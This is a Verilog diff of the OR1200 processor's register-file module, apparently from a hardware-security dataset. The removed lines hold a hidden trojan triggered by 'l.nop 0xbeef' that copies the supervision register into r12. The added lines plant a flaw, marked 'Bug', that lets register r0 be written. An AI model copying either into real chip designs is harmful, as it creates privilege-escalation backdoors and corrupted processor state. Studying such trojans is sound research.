@@ -64,8 +64,6 @@ module or1200_rf(
 
 	// Debug
 	spr_cs, spr_write, spr_addr, spr_dat_i, spr_dat_o, du_read
-	, sp_attack_enable, gpr_written_to, gpr_written_addr, gpr_written_data, sp_exception_comb,
-	sr, ex_insn
 );
 
 parameter dw = `OR1200_OPERAND_WIDTH;
@@ -113,13 +111,6 @@ input	[31:0]			spr_addr;
 input	[31:0]			spr_dat_i;
 output	[31:0]			spr_dat_o;
 input    			du_read;
-input	[31:0]			sp_attack_enable;
-output  [aw-1:0] 		gpr_written_addr;
-output  [dw-1:0] 		gpr_written_data;
-output 			        gpr_written_to;
-input   			sp_exception_comb;
-input [`OR1200_SR_WIDTH-1:0]	sr;
-input [31:0]			ex_insn;
    
 //
 // Internal wires and regs
@@ -190,22 +181,14 @@ assign rf_addra = (spr_valid & !spr_write) ? spr_addr[4:0] :
 //
 // RF write address is either from SPRS or normal from CPU control
 //
-//assign rf_addrw = (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
+assign rf_addrw = (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
 
-wire attack = sp_attack_enable[12] & (ex_insn == {8'h15, 8'h0, 16'hbeef}); // l.nop 0xbeef   
-assign rf_addrw = attack ? 32'd12 : (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
-
-assign gpr_written_addr = rf_addrw;
-   
 //
 // RF write data is either from SPRS or normal from CPU datapath
 //
-//assign rf_dataw = (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
-  
-assign rf_dataw = attack ? sr : (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
+assign rf_dataw = (spr_valid & spr_write) ? spr_dat_i : dataw; // Bug
+// assign rf_dataw = (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
 
-assign gpr_written_data = rf_dataw;
-   
 //
 // RF write enable is either from SPRS or normal from CPU control
 //
@@ -215,11 +198,8 @@ always @(`OR1200_RST_EVENT rst or posedge clk)
 	else if (~wb_freeze)
 		rf_we_allow <=  ~flushpipe;
 
-//assign rf_we = ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow;
-assign rf_we = (attack | ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow) & ~sp_exception_comb;
+assign rf_we = ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow;
 
-assign gpr_written_to = rf_we;
-   
 assign cy_we_o = cy_we_i && ~wb_freeze && rf_we_allow;
    
 //
@@ -253,8 +233,8 @@ or1200_tpram_32x32 rf_a(
 	// Port B
 	.clk_b(clk),
 	.rst_b(rst),
-	.ce_b(rf_we & ~sp_exception_comb),
-	.we_b(rf_we & ~sp_exception_comb),
+	.ce_b(rf_we),
+	.we_b(rf_we),
 	.oe_b(1'b0),
 	.addr_b(rf_addrw),
 	.di_b(rf_dataw),
@@ -278,8 +258,8 @@ or1200_tpram_32x32 rf_b(
 	// Port B
 	.clk_b(clk),
 	.rst_b(rst),
-	.ce_b(rf_we & ~sp_exception_comb),
-	.we_b(rf_we & ~sp_exception_comb),
+	.ce_b(rf_we),
+	.we_b(rf_we),
 	.oe_b(1'b0),
 	.addr_b(rf_addrw),
 	.di_b(rf_dataw),
@@ -308,8 +288,8 @@ or1200_tpram_32x32 rf_b(
       
       // Port B
       .clk_b(clk),
-      .ce_b(rf_we & ~sp_exception_comb),
-      .we_b(rf_we & ~sp_exception_comb),
+      .ce_b(rf_we),
+      .we_b(rf_we),
       .addr_b(rf_addrw),
       .di_b(rf_dataw)
       );
@@ -332,8 +312,8 @@ or1200_tpram_32x32 rf_b(
       
       // Port B
       .clk_b(clk),
-      .ce_b(rf_we & ~sp_exception_comb),
-      .we_b(rf_we & ~sp_exception_comb),
+      .ce_b(rf_we),
+      .we_b(rf_we),
       .addr_b(rf_addrw),
       .di_b(rf_dataw)
       );
@@ -361,8 +341,8 @@ or1200_rfram_generic rf_a(
 	.do_b(from_rfb),
 
 	// Port W
-	.ce_w(rf_we & ~sp_exception_comb),
-	.we_w(rf_we & ~sp_exception_comb),
+	.ce_w(rf_we),
+	.we_w(rf_we),
 	.addr_w(rf_addrw),
 	.di_w(rf_dataw)
 );
